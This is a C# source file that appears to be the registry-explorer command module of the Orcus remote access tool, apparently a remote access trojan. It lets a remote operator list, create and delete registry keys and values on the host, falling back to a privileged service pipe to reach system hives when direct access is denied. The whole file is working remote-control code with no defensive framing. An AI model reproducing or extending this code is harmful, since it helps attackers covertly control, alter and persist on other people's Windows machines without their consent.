using System;
using System.Collections.Generic;
using System.IO;
using System.Security;
using System.Text;
using Microsoft.Win32;
using Orcus.Extensions;
using Orcus.Plugins;
using Orcus.Service;
using Orcus.Shared.Commands.Registry;
using Orcus.Shared.NetSerializer;
using RegistryHive = Orcus.Shared.Commands.Registry.RegistryHive;
using RegistryValueKind = Microsoft.Win32.RegistryValueKind;

namespace Orcus.Commands.RegistryExplorer
{
    internal class RegistryCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            try
            {
                string path;
                RegistryHive root;
                Serializer serializer;

                switch ((RegistryCommunication) parameter[0])
                {
                    case RegistryCommunication.GetRegistrySubKeys:
                        root = (RegistryHive) BitConverter.ToInt32(parameter, 1);

                        path = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);
                        List<RegistrySubKey> subKeys;

                        try
                        {
                            using (
                                var regKey = RegistryExtensions.OpenRegistry(root)
                                    .OpenSubKey(path, RegistryKeyPermissionCheck.ReadSubTree))
                            {
                                subKeys = new List<RegistrySubKey>();
                                foreach (var subKeyName in regKey.GetSubKeyNames())
                                {
                                    bool isEmpty = false;
                                    try
                                    {
                                        using (var subKey = regKey.OpenSubKey(subKeyName, false))
                                        {
                                            isEmpty = subKey.GetSubKeyNames().Length == 0;
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        // ignored
                                    }

                                    subKeys.Add(new RegistrySubKey
                                    {
                                        Name = subKeyName,
                                        IsEmpty = isEmpty
                                    });
                                }
                            }
                        }
                        catch (Exception)
                        {
                            if (!ServiceConnection.Current.IsConnected || root == RegistryHive.CurrentUser)
                                throw;
                            subKeys = ServiceConnection.Current.Pipe.GetRegistrySubKeys(path, root);
                            if (subKeys == null)
                                throw;
                        }

                        serializer = new Serializer(typeof (RegistrySubKeysPackage));
                        using (
                            var ms = new MemoryStream())
                        {
                            ms.WriteByte((byte) RegistryCommunication.ResponseRegistrySubKeys);
                            serializer.Serialize(ms,
                                new RegistrySubKeysPackage
                                {
                                    Path = path,
                                    RegistrySubKeys = subKeys,
                                    RegistryHive = root
                                });
                            connectionInfo.CommandResponse(this, ms.ToArray());
                        }

                        break;
                    case RegistryCommunication.DeleteSubKey:
                        root = (RegistryHive) BitConverter.ToInt32(parameter, 1);
                        path = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);

                        try
                        {
                            using (var regKey = RegistryExtensions.OpenRegistry(root))
                                regKey.DeleteSubKeyTree(path);
                        }
                        catch (Exception)
                        {
                            if (!ServiceConnection.Current.IsConnected || root == RegistryHive.CurrentUser)
                                throw;
                            if (!ServiceConnection.Current.Pipe.DeleteSubKey(path, root))
                                throw;
                        }

                        serializer = new Serializer(typeof (RegistrySubKeyAction));
                        ResponseBytes((byte) RegistryCommunication.ResponseSubKeyDeleted,
                            serializer.Serialize(new RegistrySubKeyAction {Path = path, RegistryHive = root}),
                            connectionInfo);
                        break;
                    case RegistryCommunication.GetRegistryValues:
                        root = (RegistryHive) BitConverter.ToInt32(parameter, 1);
                        path = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);
                        List<RegistryValue> valueList;

                        try
                        {
                            using (
                                var regKey = RegistryExtensions.OpenRegistry(root).OpenSubKey(path, false)
                                )
                            {
                                valueList = new List<RegistryValue>();
                                foreach (var valueName in regKey.GetValueNames())
                                {
                                    var kind = regKey.GetValueKind(valueName);
                                    switch (kind)
                                    {
                                        case RegistryValueKind.String:
                                            valueList.Add(new RegistryValueString
                                            {
                                                Key = valueName,
                                                Value = (string) regKey.GetValue(valueName, string.Empty)
                                            });
                                            break;
                                        case RegistryValueKind.ExpandString:
                                            valueList.Add(new RegistryValueExpandString
                                            {
                                                Key = valueName,
                                                Value = (string) regKey.GetValue(valueName, string.Empty)
                                            });
                                            break;
                                        case RegistryValueKind.Binary:
                                            valueList.Add(new RegistryValueBinary
                                            {
                                                Key = valueName,
                                                Value = (byte[]) regKey.GetValue(valueName, new byte[] {})
                                            });
                                            break;
                                        case RegistryValueKind.DWord:
                                            valueList.Add(new RegistryValueDWord
                                            {
                                                Key = valueName,
                                                Value = (uint) (int) regKey.GetValue(valueName, 0)
                                            });
                                            break;
                                        case RegistryValueKind.MultiString:
                                            valueList.Add(new RegistryValueMultiString
                                            {
                                                Key = valueName,
                                                Value = (string[]) regKey.GetValue(valueName, new string[] {})
                                            });
                                            break;
                                        case RegistryValueKind.QWord:
                                            valueList.Add(new RegistryValueQWord
                                            {
                                                Key = valueName,
                                                Value = (ulong) (long) regKey.GetValue(valueName, 0)
                                            });
                                            break;
                                        default:
                                            valueList.Add(new RegistryValueUnknown
                                            {
                                                Key = valueName
                                            });
                                            break;
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            if (!ServiceConnection.Current.IsConnected || root == RegistryHive.CurrentUser)
                                throw;
                            valueList = ServiceConnection.Current.Pipe.GetRegistryValues(path, root);
                            if (valueList == null)
                                throw;
                        }

                        serializer = new Serializer(new List<Type>(RegistryValue.RegistryValueTypes)
                        {
                            typeof (RegistryValuesPackage)
                        });

                        ResponseBytes((byte) RegistryCommunication.ResponseRegistryValues,
                            serializer.Serialize(new RegistryValuesPackage
                            {
                                Path = path,
                                RegistryHive = root,
                                Values = valueList
                            }), connectionInfo);

                        break;
                    case RegistryCommunication.CreateSubKey:
                        root = (RegistryHive) BitConverter.ToInt32(parameter, 1);
                        path = Encoding.UTF8.GetString(parameter, 5, parameter.Length - 5);

                        try
                        {
                            RegistryExtensions.OpenRegistry(root)
                                .CreateSubKey(path, RegistryKeyPermissionCheck.Default);
                        }
                        catch (Exception)
                        {
                            if (!ServiceConnection.Current.IsConnected || root == RegistryHive.CurrentUser)
                                throw;
                            if (!ServiceConnection.Current.Pipe.CreateSubKey(path, root))
                                throw;
                        }

                        serializer = new Serializer(typeof (RegistrySubKeyAction));
                        ResponseBytes((byte) RegistryCommunication.ResponseSubKeyCreated,
                            serializer.Serialize(new RegistrySubKeyAction {Path = path, RegistryHive = root}),
                            connectionInfo);
                        break;
                    case RegistryCommunication.CreateValue:
                        serializer = new Serializer(new List<Type>(RegistryValue.RegistryValueTypes)
                        {
                            typeof (RegistryCreateValuePackage)
                        });
                        var package = serializer.Deserialize<RegistryCreateValuePackage>(parameter, 1);

                        try
                        {
                            using (var rootKey = RegistryExtensions.OpenRegistry(package.RegistryHive))
                            using (var subKey = rootKey.OpenSubKey(package.Path, true))
                                subKey.SetValue(package.RegistryValue.Key, package.RegistryValue.ValueObject,
                                    ConvertFromOrcusValueKind(package.RegistryValue.ValueKind));
                        }
                        catch (Exception)
                        {
                            if (!ServiceConnection.Current.IsConnected ||
                                package.RegistryHive == RegistryHive.CurrentUser)
                                throw;
                            if (
                                !ServiceConnection.Current.Pipe.CreateValue(package.Path, package.RegistryHive,
                                    package.RegistryValue))
                                throw;
                        }

                        ResponseByte((byte) RegistryCommunication.ResponseValueCreated, connectionInfo);
                        break;
                    case RegistryCommunication.DeleteValue:
                        root = (RegistryHive) BitConverter.ToInt32(parameter, 1);
                        var pathLength = BitConverter.ToInt32(parameter, 5);
                        path = Encoding.UTF8.GetString(parameter, 9, pathLength);
                        var name = Encoding.UTF8.GetString(parameter, 9 + path.Length,
                            parameter.Length - (9 + path.Length));

                        try
                        {
                            using (var rootKey = RegistryExtensions.OpenRegistry(root))
                            using (var subKey = rootKey.OpenSubKey(path, true))
                                subKey.DeleteValue(name, true);
                        }
                        catch (Exception)
                        {
                            if (!ServiceConnection.Current.IsConnected || root == RegistryHive.CurrentUser)
                                throw;
                            if (!ServiceConnection.Current.Pipe.DeleteValue(path, root, name))
                                throw;
                        }

                        ResponseByte((byte) RegistryCommunication.ResponseValueDeleted, connectionInfo);
                        break;
                    default:
                        throw new ArgumentOutOfRangeException();
                }
            }
            catch (Exception ex)
            {
                if (ex is SecurityException || ex is UnauthorizedAccessException)
                    SendPermissionDenied(ex.Message, connectionInfo);
                else
                    SendError(ex.Message, connectionInfo);
            }
        }

        private RegistryValueKind ConvertFromOrcusValueKind(Shared.Commands.Registry.RegistryValueKind registryValue)
        {
            switch (registryValue)
            {
                case Shared.Commands.Registry.RegistryValueKind.String:
                    return RegistryValueKind.String;
                case Shared.Commands.Registry.RegistryValueKind.ExpandString:
                    return RegistryValueKind.ExpandString;
                case Shared.Commands.Registry.RegistryValueKind.Binary:
                    return RegistryValueKind.Binary;
                case Shared.Commands.Registry.RegistryValueKind.DWord:
                    return RegistryValueKind.DWord;
                case Shared.Commands.Registry.RegistryValueKind.MultiString:
                    return RegistryValueKind.MultiString;
                case Shared.Commands.Registry.RegistryValueKind.QWord:
                    return RegistryValueKind.QWord;
                default:
                    return RegistryValueKind.Unknown;
            }
        }

        private void SendPermissionDenied(string message, IConnectionInfo connectionInfo)
        {
            var package = new List<byte> {(byte) RegistryCommunication.PermissionsDeniedError};
            package.AddRange(Encoding.UTF8.GetBytes(message));
            connectionInfo.CommandResponse(this, package.ToArray());
        }

        private void SendError(string message, IConnectionInfo connectionInfo)
        {
            var package = new List<byte> {(byte) RegistryCommunication.Error};
            package.AddRange(Encoding.UTF8.GetBytes(message));
            connectionInfo.CommandResponse(this, package.ToArray());
        }

        protected override uint GetId()
        {
            return 13;
        }
    }
}